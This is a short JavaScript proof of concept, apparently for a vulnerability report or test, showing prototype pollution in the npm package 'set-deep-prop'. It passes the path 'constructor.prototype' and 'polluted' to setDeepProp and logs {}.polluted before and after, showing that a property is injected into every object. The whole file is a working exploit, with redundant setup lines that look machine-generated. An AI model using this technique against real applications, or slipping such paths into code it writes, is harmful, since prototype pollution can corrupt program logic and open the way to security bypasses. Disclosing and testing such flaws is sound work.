var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const setDeepProp = require('set-deep-prop');
var obj = {};
console.log({}.polluted);
setDeepProp(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);